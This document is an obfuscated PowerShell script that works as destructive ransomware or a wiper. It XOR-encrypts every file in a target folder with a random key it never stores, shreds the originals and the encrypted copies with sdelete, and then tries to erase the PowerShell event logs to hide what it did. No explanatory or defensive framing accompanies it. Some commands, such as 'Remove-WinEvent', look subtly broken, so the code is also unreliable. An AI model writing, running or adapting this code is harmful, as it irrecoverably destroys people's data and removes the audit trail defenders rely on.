function a{$b=[int]$args[0];$c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";$d=-join((0..($b-1))|ForEach-Object{$c[(Get-Random -Maximum $c.Length)]});return $d};function b{$e=[string]$args[0];$f=[string]$args[1];$g=[string]$args[2];$h=[System.IO.File]::ReadAllBytes($e);$i=[Text.Encoding]::UTF8.GetBytes($g);$j=$i.Length;if($j-eq 0){return};$k=New-Object byte[] $h.Length;for($l=0;$l-lt $h.Length;$l++){$k[$l]=$h[$l]-bxor $i[$l%$j]};[System.IO.File]::WriteAllBytes($f,$k)};function c{$m=[string]$args[0];$n=[int]$args[1];$o=a $n;$p="C:\Users\tmq\sdelete.exe";$q=@(".enc",".exe",".txt",".jpg",".jpeg",".dat",".docx",".xlsx",".tmp");$r=Join-Path $m "encryption_log.log";if(Test-Path $r){Remove-Item -Path $r};Get-ChildItem -Path $m|ForEach-Object{$s=$_;if($s.Attributes-ne'Directory'-and $s.Extension-ne'.enc'){$t=Join-Path $m "$($s.Name).enc";b $s.FullName $t $o;Add-Content -Path $r -Value "$($s.FullName) encrypted $t";if($q-contains $s.Extension){$u="& `"$p`" -accepteula -p 3 -s `"$($s.FullName)`"";Invoke-Expression $u}else{Remove-Item -Path $s.FullName}}};$v=Join-Path $m "encrypted_files.zip";$w='C:\Program Files\7-Zip\7z.exe';$x=Get-ChildItem -Path $m -Filter "*.enc";if($x.Count-gt 0){$y=@();foreach($z in $x){$y+="`"$($z.FullName)`""};$aa=$y-join' ';$ab="& `"$w`" a `"$v`" -parameter-none $aa";Invoke-Expression $ab;$x|ForEach-Object{$ac="& `"$p`" -accepteula -p 3 -s `"$($_.FullName)`"";Invoke-Expression $ac}}};$ad='C:\Users\tmq\Desktop\test';$ae=1024;c $ad $ae; "Windows PowerShell", "Microsoft-Windows-PowerShell%4Operational" | ForEach-Object { Get-WinEvent -LogName $_ | ForEach-Object { Remove-WinEvent -LogName $_.LogName -EventId $_.Id } }
